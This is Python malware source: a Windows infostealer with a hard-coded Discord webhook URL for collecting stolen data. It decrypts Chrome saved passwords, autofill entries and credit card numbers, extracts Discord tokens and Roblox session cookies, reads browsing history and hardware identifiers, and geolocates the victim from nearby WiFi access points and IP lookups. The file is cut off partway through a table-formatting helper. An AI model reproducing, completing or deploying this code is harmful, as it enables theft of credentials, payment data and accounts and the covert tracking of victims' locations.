
import os
import re
import json
import shutil
import time
import win32con
from base64 import b64decode
from subprocess import PIPE
from win32api import SetFileAttributes
from win32crypt import CryptUnprotectData
from requests import post
from tempfile import TemporaryDirectory
from zipfile import ZipFile, ZIP_DEFLATED

WEBHOOK_URL = "https://discord.com/api/webhooks/1495247089800843364/vqsAe2jXiLCBm6M0rJs-WpHLONsDBTZn7O4LVgUUID3Lc8QO8Q3lzP7mybP_1XU8oGoj"

def get_mac_address():
    try:
        import uuid
        mac = uuid.getnode()
        if (mac >> 40) % 2:
            return "NotFound"
        else:
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0,12,2))
    except:
        return "NotFound"

def get_hwid():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        value, regtype = winreg.QueryValueEx(key, "MachineGuid")
        if value:
            return value
    except Exception:
        pass
    try:
        import subprocess
        cmd = 'wmic csproduct get uuid'
        output = subprocess.check_output(cmd, shell=True).decode(errors='ignore').split('\n')
        uuid_val = [line.strip() for line in output if line.strip() and line.strip().lower() != 'uuid']
        if uuid_val:
            return uuid_val[0]
    except Exception:
        pass
    try:
        cmd = 'powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID)"'
        output = os.popen(cmd).read().strip()
        if output and "{" not in output and output:
            return output
    except Exception:
        pass
    return "Unknown"


# -- Enhanced WiFi scan: get all BSSID/SSID/signal/channel for APs in range (Windows) --
def _get_wifi_networks_windows_full():
    import subprocess
    wifi_list = []
    try:
        out = subprocess.check_output("netsh wlan show networks mode=bssid", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        cur_ssid = None
        bssid_data = []
        for line in out.split('\n'):
            line = line.strip()
            if line.lower().startswith('ssid ') and ':' in line:
                cur_ssid = line.split(':',1)[1].strip()
                bssid_data = []
            elif line.lower().startswith('bssid ') and ':' in line:
                bssid_mac = line.split(':',1)[1].strip()
                bssid_entry = {'ssid': cur_ssid, 'bssid': bssid_mac}
                bssid_data.append(bssid_entry)
                wifi_list.append(bssid_entry)
            elif line.lower().startswith('signal') and ':' in line and bssid_data:
                v = line.split(':',1)[1].strip()
                bssid_data[-1]['signal'] = v
                wifi_list[-1]['signal'] = v
            elif line.lower().startswith('channel') and ':' in line and bssid_data:
                v = line.split(':',1)[1].strip()
                bssid_data[-1]['channel'] = v
                wifi_list[-1]['channel'] = v
        return wifi_list
    except Exception:
        return []

def _get_wifi_current_interface_full():
    import subprocess
    try:
        out = subprocess.check_output("netsh wlan show interfaces", shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
        res = {}
        for line in out.split('\n'):
            if ':' not in line: continue
            k,v = line.split(':',1)
            k = k.strip().lower()
            v = v.strip()
            if k in ('ssid','bssid','signal','channel','profile','state'):
                res[k] = v
        if res.get("ssid") or res.get("bssid"):
            return res
    except Exception:
        pass
    return None

def get_advanced_geolocation(ip=None, force_ip_only=False):
    # (Unchanged)
    try:
        import requests
        info_lines = []
        wifi_aps = _get_wifi_networks_windows_full()
        curr_wifi = _get_wifi_current_interface_full() or {}
        def standardize_bssid(mac):
            mac = mac.replace("-",":").replace(" ","").lower()
            if len(mac)==12: mac = ":".join([mac[i:i+2] for i in range(0,12,2)])
            return mac
        seen_mac = set()
        wifi_payload = []
        for ap in wifi_aps:
            mac = ap.get('bssid')
            if mac:
                mac_fmt = standardize_bssid(mac)
                if mac_fmt in seen_mac:
                    continue
                seen_mac.add(mac_fmt)
                entry = {"macAddress": mac_fmt}
                if 'signal' in ap and '%' in ap['signal']:
                    try:
                        perc = int(ap['signal'].replace('%','').strip())
                        dbm = int(perc/2 - 100)
                        entry['signalStrength'] = dbm
                    except: pass
                if 'channel' in ap:
                    try:
                        entry['channel'] = int(ap['channel'])
                    except: pass
                wifi_payload.append(entry)
        primary_bssid = curr_wifi.get('bssid')
        if primary_bssid:
            mac_fmt = standardize_bssid(primary_bssid)
            exists = next((x for x in wifi_payload if x['macAddress']==mac_fmt), None)
            if not exists:
                entry = {"macAddress": mac_fmt}
                if 'signal' in curr_wifi and '%' in curr_wifi['signal']:
                    try:
                        perc = int(curr_wifi['signal'].replace('%','').strip())
                        dbm = int(perc/2 - 100)
                        entry['signalStrength'] = dbm
                    except: pass
                if 'channel' in curr_wifi:
                    try:
                        entry['channel'] = int(curr_wifi['channel'])
                    except: pass
                wifi_payload.insert(0, entry)
            else:
                wifi_payload = [exists] + [x for x in wifi_payload if x['macAddress']!=mac_fmt]

        location_candidates = []
        used_main_wifi = False

        if not force_ip_only and wifi_payload:
            try:
                mlspayload = {"wifiAccessPoints": wifi_payload}
                resp = requests.post("https://location.services.mozilla.com/v1/geolocate?key=geoclue", json=mlspayload, timeout=10)
                if resp.ok:
                    mls = resp.json()
                    mls_lat, mls_lon = mls['location']['lat'], mls['location']['lng']
                    acc = mls.get('accuracy')
                    address_detail = ""
                    try:
                        osm = requests.get(
                            "https://nominatim.openstreetmap.org/reverse",
                            params={"lat": mls_lat, "lon": mls_lon, "format": "json", "addressdetails":1},
                            headers={"User-Agent": "advanced-geolocate-py"}
                        )
                        if osm.ok:
                            jso = osm.json()
                            address_detail = jso.get("display_name") or ""
                            parts = jso.get("address",{})
                            fields = [
                                parts.get("road",""),
                                parts.get("neighbourhood",""),
                                parts.get("suburb",""),
                                parts.get("city_district") or "",
                                parts.get("village") or "",
                                parts.get("town") or "",
                                parts.get("city") or "",
                                parts.get("county") or "",
                                parts.get("state") or "",
                                parts.get("postcode") or "",
                                parts.get("country") or ""
                            ]
                            addr_str = ", ".join(x for x in fields if x)
                            if addr_str:
                                address_detail = f"{addr_str}\n(OSM: {address_detail})"
                    except Exception:
                        pass
                    label = f"MLS WiFi Location: lat={mls_lat} lon={mls_lon} acc~{acc}m"
                    involved_macs = ", ".join([x["macAddress"] + ("(curr)" if primary_bssid and x["macAddress"]==standardize_bssid(primary_bssid) else "") for x in wifi_payload])
                    out_str = f"{label}\nNearby WiFi BSSID(s): {involved_macs}\n{address_detail}"
                    info_lines.append(out_str)
                    location_candidates.append(('WiFi (MLS)', acc or 99999, mls_lat, mls_lon, out_str))
                    used_main_wifi = True
            except Exception as e:
                info_lines.append(f"WiFi GeoLocation via MLS failed: {e}")

        GOOGLE_APIKEY = None
        if not force_ip_only and not used_main_wifi and wifi_payload and GOOGLE_APIKEY:
            try:
                reqbody = {"wifiAccessPoints": wifi_payload}
                resp = requests.post(f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_APIKEY}", json=reqbody, timeout=8)
                if resp.ok:
                    js = resp.json()
                    pos = js['location']
                    lat, lon = pos['lat'], pos['lng']
                    acc = js.get("accuracy")
                    address_detail = ""
                    try:
                        osm = requests.get(
                            "https://nominatim.openstreetmap.org/reverse",
                            params={"lat": lat, "lon": lon, "format": "json", "addressdetails":1})
                        if osm.ok:
                            jso = osm.json()
                            address_detail = jso.get("display_name") or ""
                    except Exception:
                        pass
                    label = f"Google WiFi Location: lat={lat} lon={lon} acc~{acc}m"
                    macs = ', '.join([x['macAddress'] for x in wifi_payload])
                    out_str = f"{label}\nBSSIDs: {macs}\n{address_detail}"
                    info_lines.append(out_str)
                    location_candidates.append(('WiFi (Google)', acc or 99999, lat, lon, out_str))
            except Exception as e:
                info_lines.append(f"Google WiFi Geolocation fail: {e}")

        try:
            if ip is None:
                try:
                    ip = requests.get("https://api.ipify.org", timeout=4).text.strip()
                except Exception:
                    ip = None
            ip_data_sources = [
                ("ip-api", f"http://ip-api.com/json/{ip if ip else ''}", lambda r: (r.get("lat"), r.get("lon"), r.get("accuracy", "?"), r)),
                ("ipinfo.io", f"https://ipinfo.io/{ip}/json", lambda r: (r.get("loc",",").split(",")[0], r.get("loc",",").split(",")[1] if ',' in r.get("loc","") else "", "?", r)),
                ("ipgeolocation.io", f"https://api.ipgeolocation.io/ipgeo?ip={ip if ip else ''}", lambda r: (r.get("latitude"), r.get("longitude"), "?", r)),
                ("iplocation.net", f"https://api.iplocation.net/?ip={ip if ip else ''}", lambda r: (r.get("latitude"), r.get("longitude"), "?", r)),
            ]
            for (label, url, parser) in ip_data_sources:
                try:
                    req = requests.get(url, timeout=6)
                    if req.ok:
                        j = req.json()
                        lat, lon, acc, row = parser(j)
                        if lat and lon:
                            address_detail = ""
                            try:
                                osm = requests.get(
                                    "https://nominatim.openstreetmap.org/reverse",
                                    params={"lat": lat, "lon": lon, "format": "json", "addressdetails":1},
                                    headers={"User-Agent": "advanced-geolocate-py"}
                                )
                                if osm.ok:
                                    jso = osm.json()
                                    address_detail = jso.get("display_name") or ""
                                    parts = jso.get("address",{})
                                    fields = [
                                        parts.get("road",""),
                                        parts.get("neighbourhood",""),
                                        parts.get("suburb",""),
                                        parts.get("city_district") or "",
                                        parts.get("village") or "",
                                        parts.get("town") or "",
                                        parts.get("city") or "",
                                        parts.get("county") or "",
                                        parts.get("state") or "",
                                        parts.get("postcode") or "",
                                        parts.get("country") or ""
                                    ]
                                    addr_str = ", ".join(x for x in fields if x)
                                    if addr_str:
                                        address_detail = f"{addr_str}\n(OSM: {address_detail})"
                            except Exception:
                                pass
                            details_desc = f"{label}: {j.get('country','')}, {j.get('region','') if label=='ipinfo.io' else j.get('regionName','')}, {j.get('city','')} IP:{j.get('ip','') if label=='ipinfo.io' else j.get('query','')}"
                            ip_out = f"{details_desc}, coords={lat},{lon}\n{address_detail}".strip()
                            location_candidates.append((label, acc, lat, lon, ip_out))
                except Exception as e:
                    info_lines.append(f"{label} IP geolocation failed: {e}")
        except Exception as e:
            info_lines.append(f"IP-based geolocation major error: {e}")

        if location_candidates:
            location_candidates_sorted = sorted(location_candidates, key=lambda x: (0 if "wifi" in x[0].lower() else 1, float(x[1]) if str(x[1]).replace('.','',1).isdigit() else 999999))
            best = location_candidates_sorted[0]
            others = location_candidates_sorted[1:] if len(location_candidates_sorted)>1 else []
            result_str = best[-1]
            others_str = "\n\n---- Other Location Guesses ----\n" + "\n\n".join(c[-1] for c in others) if others else ""
            return result_str + (others_str if others else "")
        return "Unable to determine geolocation via WiFi or IP (all methods failed)."
    except Exception as e:
        return f"Location error (wifi/ip geolocate): {e}"

# Alias for drop-in
get_high_accuracy_geolocation = get_advanced_geolocation

# (rest unchanged)

def get_ipinfo():
    """
    Try to get as much as possible for external IP and location (country, city, etc).
    """
    try:
        import urllib.request, json
        try:
            api = urllib.request.urlopen("http://ip-api.com/json/").read().decode()
            j = json.loads(api)
            ip = j.get("query", "Unknown")
            country = j.get("country", "Unknown")
            city = j.get("city", "Unknown")
            return ip, country, city
        except Exception:
            pass
        ip = urllib.request.urlopen("https://api64.ipify.org").read().decode().strip()
        country = urllib.request.urlopen(f"https://ipapi.co/{ip}/country_name").read().decode().strip()
        city = urllib.request.urlopen(f"https://ipapi.co/{ip}/city").read().decode().strip()
        return ip, country, city
    except Exception:
        return "Unknown", "Unknown", "Unknown"

def get_browsing_history(tmpdir):
    # (Unchanged)
    history_db = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History"
    )
    cpy = os.path.join(tmpdir, "ChromeHistory.db")
    history_items = []
    if not os.path.exists(history_db):
        return []
    try:
        shutil.copy2(history_db, cpy)
        import sqlite3
        db = sqlite3.connect(cpy)
        cursor = db.cursor()
        try:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
            rows = cursor.fetchall()
            for url, title, last_visit_time in rows:
                try:
                    visit_time = int(last_visit_time)
                    if visit_time > 11644473600000000:
                        timestamp = (visit_time - 11644473600000000) // 1000000
                        timestr = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
                    else:
                        timestr = "Unknown"
                except Exception:
                    timestr = "Unknown"
                history_items.append({
                    "url": url,
                    "title": title,
                    "visit_time": timestr,
                    "timestamp_raw": last_visit_time
                })
            cursor.close()
            db.close()
        except Exception:
            pass
    except Exception:
        pass
    return history_items

def get_system_info():
    # (Unchanged)
    info = {}
    try:
        import platform
        uname = platform.uname()
        info['OS'] = uname.system
        info['OS_Release'] = uname.release
        info['Platform'] = platform.platform()
        info['OS_Version'] = uname.version
        info['Arch'] = uname.machine
        info['OS_Full_Detail'] = info['OS']
        try:
            if uname.system == "Windows":
                import winreg
                hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                def _read_by_names(key, names):
                    vals = []
                    for n in names:
                        try:
                            v, _ = winreg.QueryValueEx(key, n)
                            if v: vals.append(str(v))
                        except Exception:
                            continue
                    return vals
                full_name = _read_by_names(hkey, ["ProductName", "DisplayVersion", "EditionID", "ReleaseId", "CurrentBuild", "CurrentBuildNumber"])
                info['OS_Full_Detail'] = " | ".join([v for v in full_name if v])
        except Exception:
            pass
        if not info.get("OS_Full_Detail") or info["OS_Full_Detail"] == "Windows":
            try:
                import subprocess
                out = subprocess.check_output("systeminfo", shell=True).decode(errors='ignore')
                for line in out.splitlines():
                    if "OS Name:" in line or "OS Version:" in line:
                        info.setdefault("OS_Full_Detail", "")
                        info["OS_Full_Detail"] += line.split(":",1)[1].strip() + " | "
            except Exception:
                pass

        cpuinfo_dict = {}
        try:
            import wmi
            c = wmi.WMI()
            cpus = c.Win32_Processor()
            cpu_names = []
            for cpu in cpus:
                cpu_names.append(cpu.Name.strip())
                cpuinfo_dict["CPU_Manufacturer"] = getattr(cpu, "Manufacturer", "Unknown")
                cpuinfo_dict["CPU_Architecture"] = getattr(cpu, "Architecture", "Unknown")
                cpuinfo_dict["CPU_Cores"] = getattr(cpu, "NumberOfCores", "Unknown")
                cpuinfo_dict["CPU_LogicalProcessors"] = getattr(cpu, "NumberOfLogicalProcessors", "Unknown")
                cpuinfo_dict["CPU_MaxClockSpeed"] = getattr(cpu, "MaxClockSpeed", "Unknown")
                cpuinfo_dict["CPU_ID"] = getattr(cpu, "ProcessorId", "Unknown")
                cpuinfo_dict["CPU_L2CacheSize"] = getattr(cpu, "L2CacheSize", "Unknown")
                cpuinfo_dict["CPU_L3CacheSize"] = getattr(cpu, "L3CacheSize", "Unknown")
            info['CPU_Name'] = ', '.join(cpu_names)
            info.update(cpuinfo_dict)
        except Exception:
            try:
                import cpuinfo, psutil
                cpu = cpuinfo.get_cpu_info()
                info['CPU_Name'] = cpu.get('brand_raw', 'Unknown')
                info['CPU_Bits'] = cpu.get('bits', 'Unknown')
                info['CPU_Arch'] = cpu.get('arch', 'Unknown')
                info['CPU_Count_Physical'] = psutil.cpu_count(logical=False)
                info['CPU_Count_Logical'] = psutil.cpu_count(logical=True)
                cpufreq = psutil.cpu_freq()
                if cpufreq:
                    info['CPU_Freq_Current'] = cpufreq.current
                    info['CPU_Freq_Min'] = cpufreq.min
                    info['CPU_Freq_Max'] = cpufreq.max
                info['CPU_L2_Cache'] = cpu.get('l2_cache_size', 'Unknown')
                info['CPU_L3_Cache'] = cpu.get('l3_cache_size', 'Unknown')
            except Exception:
                info['CPU_Name'] = uname.processor or platform.processor()
                pass

        ram_total_physical = 0
        ram_modules = []
        wmi_failed = False
        try:
            import wmi
            c = wmi.WMI()
            for mem in c.Win32_PhysicalMemory():
                try:
                    size = int(mem.Capacity)
                except Exception:
                    size = 0
                ram_total_physical += size
                ram_modules.append({
                    "Capacity_B"      : size,
                    "Capacity_GB"     : round(size / (1024**3), 3) if size else 0,
                    "Manufacturer"    : getattr(mem, "Manufacturer", ""),
                    "PartNumber"      : getattr(mem, "PartNumber", ""),
                    "Speed"           : getattr(mem, "Speed", ""),
                    "SerialNumber"    : getattr(mem, "SerialNumber", ""),
                    "FormFactor"      : getattr(mem, "FormFactor", ""),
                    "ConfiguredVoltage": getattr(mem, "ConfiguredVoltage", ""),
                    "DataWidth"       : getattr(mem, "DataWidth", ""),
                })
        except Exception:
            wmi_failed = True
        ram_psutil_total = 0
        try:
            import psutil
            vmem = psutil.virtual_memory()
            ram_psutil_total = vmem.total
            info['RAM_Virtual_Total'] = vmem.total
            info['RAM_Virtual_Available'] = vmem.available
            info['RAM_Virtual_Used'] = vmem.used
            info['RAM_Virtual_Free'] = vmem.free
            info['RAM_Virtual_Percent'] = vmem.percent
            smem = psutil.swap_memory()
            info['Swap_Total'] = smem.total
            info['Swap_Used'] = smem.used
            info['Swap_Free'] = smem.free
            info['Swap_Percent'] = smem.percent
        except Exception:
            pass

        if not ram_total_physical and not ram_psutil_total:
            try:
                import subprocess
                s_out = subprocess.check_output("systeminfo", shell=True).decode(errors="ignore")
                match = re.search(r"(?:Total Physical Memory|Physical Memory Total)[^\d]+([\d,]+)[ ]*MB", s_out)
                if match:
                    mb = int(match.group(1).replace(",", ""))
                    ram_total_physical = mb * 1024 * 1024
            except Exception:
                pass
        if not ram_total_physical and not ram_modules:
            try:
                import subprocess
                lines = subprocess.check_output("wmic memorychip get capacity", shell=True).decode(errors="ignore").splitlines()
                for line in lines:
                    line = line.strip()
                    if line.isdigit():
                        size = int(line)
                        ram_modules.append({
                            "Capacity_B": size,
                            "Capacity_GB": round(size / (1024**3), 3)
                        })
                        ram_total_physical += size
            except Exception:
                pass
        info['RAM_Total_Physical'] = ram_total_physical if ram_total_physical else ram_psutil_total
        info['RAM_Modules'] = ram_modules

        try:
            import wmi
            c = wmi.WMI()
            for base in c.Win32_BaseBoard():
                info['Motherboard_Manufacturer'] = getattr(base, "Manufacturer", "")
                info['Motherboard_Product'] = getattr(base, "Product", "")
                info['Motherboard_Serial'] = getattr(base, "SerialNumber", "")
        except Exception:
            pass

        disks = []
        try:
            import wmi, psutil
            c = wmi.WMI()
            for disk in c.Win32_DiskDrive():
                disk_dict = {
                    "Model": getattr(disk, "Model", ""),
                    "Serial": getattr(disk, "SerialNumber", ""),
                    "Size": getattr(disk, "Size", ""),
                    "InterfaceType": getattr(disk, "InterfaceType", ""),
                    "MediaType": getattr(disk, "MediaType", ""),
                    "Partitions": getattr(disk, "Partitions", ""),
                    "FirmwareRevision": getattr(disk, "FirmwareRevision", ""),
                }
                disks.append(disk_dict)
            psutil_disks = []
            partitions = psutil.disk_partitions(all=False)
            for p in partitions:
                try:
                    usage = psutil.disk_usage(p.mountpoint)
                except Exception:
                    usage = None
                psutil_disks.append({
                    "Device": p.device,
                    "Mountpoint": p.mountpoint,
                    "FileSystemType": p.fstype,
                    "Opts": p.opts,
                    "Usage": {
                        "Total": usage.total if usage else "Unknown",
                        "Used": usage.used if usage else "Unknown",
                        "Free": usage.free if usage else "Unknown",
                        "Percent": usage.percent if usage else "Unknown"
                    }
                })
            info['Disks_Devices'] = disks
            info['Disks'] = psutil_disks
        except Exception:
            pass

        netadapters = []
        try:
            import wmi, psutil
            c = wmi.WMI()
            for nic in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                netadapters.append({
                    "Description": getattr(nic, "Description", ""),
                    "MAC": getattr(nic, "MACAddress", ""),
                    "IP": getattr(nic, "IPAddress", []),
                    "Gateway": getattr(nic, "DefaultIPGateway", []),
                    "DHCP Server": getattr(nic, "DHCPServer", ""),
                    "DNS Domain": getattr(nic, "DNSDomain", ""),
                    "ServiceName": getattr(nic, "ServiceName", ""),
                })
            addrs = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            for name, addr_list in addrs.items():
                mac, ipv4, ipv6 = None, None, None
                for addr in addr_list:
                    if addr.family == 17 or getattr(addr, 'family', None) == 'AF_LINK':
                        mac = addr.address
                    elif addr.family == 2 or getattr(addr, 'family', None) == 'AF_INET':
                        ipv4 = addr.address
                    elif addr.family == 23 or getattr(addr, 'family', None) == 'AF_INET6':
                        ipv6 = addr.address
                na_stat = stats.get(name, None)
                netadapters.append({
                    "Name": name,
                    "MAC": mac,
                    "IPv4": ipv4,
                    "IPv6": ipv6,
                    "IsUp": na_stat.isup if na_stat else None,
                    "Duplex": getattr(na_stat, 'duplex', None) if na_stat else None,
                    "Speed": getattr(na_stat, 'speed', None) if na_stat else None
                })
            info['NetworkAdapters'] = netadapters
        except Exception:
            pass

    except Exception:
        pass

    gpu_infos = []
    tried_dxdiag = False
    try:
        try:
            import GPUtil
            gpus = GPUtil.getGPUs()
            if gpus:
                for gpu in gpus:
                    gpu_infos.append({
                        'ID': gpu.id,
                        'Name': gpu.name,
                        'Driver': gpu.driver,
                        'UUID': getattr(gpu, 'uuid', ""),
                        'Memory Total MB': gpu.memoryTotal,
                        'Memory Free MB': gpu.memoryFree,
                        'Memory Used MB': gpu.memoryUsed,
                        'Memory Util': getattr(gpu, 'memoryUtil', 'Unknown'),
                        'Load': gpu.load,
                        'Temperature': getattr(gpu, 'temperature', 'Unknown'),
                    })
        except Exception:
            pass
        if not gpu_infos:
            try:
                import wmi
                w = wmi.WMI()
                for gpu in w.Win32_VideoController():
                    driverdate = getattr(gpu, 'DriverDate', '')
                    try: driverdate = str(driverdate)
                    except: driverdate = ''
                    gpu_infos.append({
                        'Name': getattr(gpu, 'Name', ''),
                        'Processor': getattr(gpu, 'VideoProcessor', ''),
                        'DriverVersion': getattr(gpu, 'DriverVersion', ''),
                        'DriverDate': driverdate,
                        'Status': getattr(gpu, 'Status', ''),
                        'AdapterRAM': getattr(gpu, 'AdapterRAM', '')
                    })
            except Exception:
                tried_dxdiag = True
        if not gpu_infos and not tried_dxdiag:
            tried_dxdiag = True
            try:
                import tempfile
                import subprocess
                dxdiag_txt = os.path.join(tempfile.gettempdir(), "dxdiag_output.txt")
                subprocess.run(f'dxdiag /t "{dxdiag_txt}"', shell=True, timeout=10)
                with open(dxdiag_txt, "r", encoding="utf-16", errors="ignore") as file:
                    lines = file.readlines()
                for i, line in enumerate(lines):
                    if "Card name:" in line:
                        name = line.split("Card name:")[1].strip()
                        gpu_infos.append({'Name': name, 'RAM': 'Unknown'})
            except Exception:
                pass
    except Exception:
        pass
    if gpu_infos:
        info['GPU'] = gpu_infos
    return info

# (rest of the code unchanged - functions below unchanged...)

def find_discord_tokens():
    # ... (unchanged)
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA') or "", "Discord"),
        os.path.join(os.getenv('APPDATA') or "", "discordcanary"),
        os.path.join(os.getenv('APPDATA') or "", "discordptb"),
        os.path.join(os.getenv('APPDATA') or "", "Lightcord")
    ]
    pattern = r"dQw4w9WgXcQ:([^\"]+)"
    key = None
    for path in paths:
        try:
            local_state = os.path.join(path, "Local State")
            if os.path.isfile(local_state):
                with open(local_state, "r", encoding="utf-8") as f:
                    local_state_data = json.loads(f.read())
                    key = b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
                    key = CryptUnprotectData(key, None, None, None, 0)[1]
        except: key = None
        try:
            leveldb = os.path.join(path, "Local Storage", "leveldb")
            if not os.path.exists(leveldb):
                continue
            for filename in os.listdir(leveldb):
                if not filename.endswith(".ldb") and not filename.endswith(".log"):
                    continue
                filepath = os.path.join(leveldb, filename)
                with open(filepath, "r", errors="ignore") as file:
                    for line in file:
                        for match in re.findall(pattern, line):
                            rawtok = "dQw4w9WgXcQ:" + match
                            try:
                                decrypted = CryptUnprotectData(b64decode(match), None, None, None, 0)[1]
                                if decrypted:
                                    tokens.append(decrypted.decode(errors="ignore"))
                                else:
                                    tokens.append(match)
                            except:
                                tokens.append(match)
        except Exception:
            continue
    cleaned = []
    for t in tokens:
        t = t.replace("\\", "")
        if t and t not in cleaned:
            cleaned.append(t)
    return cleaned

def get_chrome_passwords(tmpdir):
    # ... (unchanged)
    chrome_user_dir = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default"
    )
    results = {
        "passwords": [],
        "autofills": [],
        "credit_cards": [],
        "emails": [],
        "phone_numbers": [],
        "addresses": [],
    }
    def get_chrome_key():
        try:
            with open(os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
            ), "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key
        except Exception:
            return None
    try:
        chrome_key = get_chrome_key()
        import sqlite3

        # ---- Passwords ----
        login_db = os.path.join(chrome_user_dir, "Login Data")
        cpy_login = os.path.join(tmpdir, "LoginData.db")
        if os.path.exists(login_db):
            shutil.copy2(login_db, cpy_login)
            db = sqlite3.connect(cpy_login)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
            for origin_url, action_url, username, pwd in cursor.fetchall():
                try:
                    decrypted = CryptUnprotectData(pwd, None, None, None, 0)[1]
                    decrypted = decrypted.decode(errors="ignore")
                except Exception:
                    decrypted = ""
                entry = {
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username": username,
                    "password": decrypted
                }
                results["passwords"].append(entry)
            cursor.close()
            db.close()

        # ---- Autofill (emails, phones, names, etc.) ----
        autofill_db = os.path.join(chrome_user_dir, "Web Data")
        cpy_web = os.path.join(tmpdir, "WebData.db")
        if os.path.exists(autofill_db):
            shutil.copy2(autofill_db, cpy_web)
            db = sqlite3.connect(cpy_web)
            cursor = db.cursor()
            try:
                cursor.execute("SELECT name, value, date_created FROM autofill")
                for name, value, date_created in cursor.fetchall():
                    entry = {"field": name, "value": value, "date_created": date_created}
                    results["autofills"].append(entry)
                    lowname = name.lower()
                    if "email" in lowname and value not in results["emails"]:
                        results["emails"].append(value)
                    if ("phone" in lowname or "tel" in lowname) and value not in results["phone_numbers"]:
                        results["phone_numbers"].append(value)
                    if "address" in lowname and value not in results["addresses"]:
                        results["addresses"].append(value)
            except Exception:
                pass
            try:
                cursor.execute("SELECT full_name, company_name, street_address, city, state, zipcode, email, phone_number FROM autofill_profiles")
                for row in cursor.fetchall():
                    results["addresses"].append({
                        "full_name": row[0],
                        "company_name": row[1],
                        "street_address": row[2],
                        "city": row[3],
                        "state": row[4],
                        "zipcode": row[5],
                        "email": row[6],
                        "phone_number": row[7],
                    })
                    if row[6] and row[6] not in results["emails"]:
                        results["emails"].append(row[6])
                    if row[7] and row[7] not in results["phone_numbers"]:
                        results["phone_numbers"].append(row[7])
            except Exception:
                pass
            cursor.close()
            db.close()
        cards_db = os.path.join(chrome_user_dir, "Web Data")
        cpy_cards = os.path.join(tmpdir, "WebDataCards.db")
        if os.path.exists(cards_db):
            shutil.copy2(cards_db, cpy_cards)
            db = sqlite3.connect(cpy_cards)
            cursor = db.cursor()
            try:
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for name, month, year, enc_card in cursor.fetchall():
                    try:
                        card_number = CryptUnprotectData(enc_card, None, None, None, 0)[1]
                        card_number = card_number.decode(errors='ignore')
                    except Exception:
                        card_number = ""
                    entry = {
                        "name_on_card": name,
                        "expiration_month": month,
                        "expiration_year": year,
                        "card_number": card_number
                    }
                    results["credit_cards"].append(entry)
            except Exception:
                pass
            cursor.close()
            db.close()
    except Exception:
        pass
    results["emails"] = list({v for v in results["emails"] if v})
    results["phone_numbers"] = list({v for v in results["phone_numbers"] if v})
    results["addresses"] = [a for a in results["addresses"] if any(a.values())] if results["addresses"] and type(results["addresses"][0]) is dict else results["addresses"]
    return results

def find_roblox_tokens():
    # ... (unchanged)
    roblox_keywords = ['roblox', 'krnl', 'synapse', 'electron', 'hydrogen', 'script-ware']
    process_ctx = ' '.join(os.sys.argv).lower()
    try:
        import psutil
        parent = psutil.Process(os.getpid()).parent()
        process_ctx += ' ' + parent.name().lower()
    except Exception:
        pass
    if not any(k in process_ctx for k in roblox_keywords):
        return {}
    cookie_paths = [
        os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"
        ),
        os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"
        ),
    ]
    roblox_cookies = {}
    RBX_SESSION_TRACKER = {}  # Keep RBXSessionTracker keys in this dict, by host
    for cookie_path in cookie_paths:
        if not os.path.exists(cookie_path):
            continue
        try:
            import sqlite3
            db = sqlite3.connect(cookie_path)
            cursor = db.cursor()
            cursor.execute(
                "SELECT host_key, name, path, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com'"
            )
            key = None
            chrome_local_state = os.path.join(
                os.environ["USERPROFILE"],
                "AppData",
                "Local",
                "Google",
                "Chrome",
                "User Data",
                "Local State",
            )
            try:
                if os.path.exists(chrome_local_state):
                    with open(chrome_local_state, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                        key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        key = CryptUnprotectData(key, None, None, None, 0)[1]
            except Exception:
                key = None
            for host_key, name, path_, enc_val in cursor.fetchall():
                cookie_val = ""
                if key:
                    try:
                        cookie_val = CryptUnprotectData(enc_val, None, None, None, 0)[1].decode(errors='ignore')
                    except Exception:
                        cookie_val = ""
                else:
                    try:
                        cookie_val = CryptUnprotectData(enc_val, None, None, None, 0)[1].decode(errors='ignore')
                    except Exception:
                        cookie_val = ""
                if cookie_val:
                    if host_key not in roblox_cookies:
                        roblox_cookies[host_key] = []
                    roblox_cookies[host_key].append({"name": name, "path": path_, "value": cookie_val})
                    if name.lower() == "rbxsestracker":
                        if host_key not in RBX_SESSION_TRACKER:
                            RBX_SESSION_TRACKER[host_key] = []
                        RBX_SESSION_TRACKER[host_key].append({
                            "path": path_,
                            "value": cookie_val
                        })
            cursor.close()
            db.close()
        except Exception:
            continue
    if RBX_SESSION_TRACKER:
        roblox_cookies["_RBXSessionTracker"] = RBX_SESSION_TRACKER
    return roblox_cookies

def table(rows, header):
    if not rows:
        return ""
    if isinstance(rows, dict):
        rows = [[k, str(v)] for k, v in rows.items()]
        header = ["Key","Value"]
